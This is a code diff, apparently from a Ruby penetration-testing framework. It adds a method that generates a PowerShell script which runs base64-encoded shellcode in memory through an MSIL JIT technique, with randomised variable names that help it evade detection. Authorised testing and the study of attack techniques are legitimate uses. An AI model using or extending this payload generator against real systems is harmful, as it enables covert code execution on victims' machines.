@@ -73,6 +73,37 @@ module Payload
                                  hash_sub).gsub(/(?<!\r)\n/, "\r\n")
   end
 
+  #
+  # MSIL JIT approach as demonstrated by Matt Graeber
+  # http://www.exploit-monday.com/2013/04/MSILbasedShellcodeExec.html
+  # Referencing PowerShell Empire data/module_source/code_execution/Invoke-ShellcodeMSIL.ps1
+  #
+  def self.to_win32pe_psh_msil(template_path, code)
+    rig = Rex::RandomIdentifier::Generator.new
+    rig.init_var(:func_build_dyn_type)
+    rig.init_var(:func_get_meth_addr)
+    rig.init_var(:var_type_name)
+    rig.init_var(:var_dyn_asm)
+    rig.init_var(:var_dyn_mod)
+    rig.init_var(:var_tgt_meth)
+    rig.init_var(:var_dyn_type)
+    rig.init_var(:var_dyn_meth)
+    rig.init_var(:var_args)
+    rig.init_var(:var_xor)
+    rig.init_var(:var_sc_addr)
+    rig.init_var(:var_sc)
+    rig.init_var(:var_src_meth)
+    rig.init_var(:str_addr_loc)
+    rig.init_var(:str_tgt_meth)
+    rig.init_var(:str_src_type)
+    rig.init_var(:str_tgt_type)
+
+    hash_sub = rig.to_h
+    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
+
+    read_replace_script_template(template_path, "to_mem_msil.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
+  end
+
 end
 end
 end
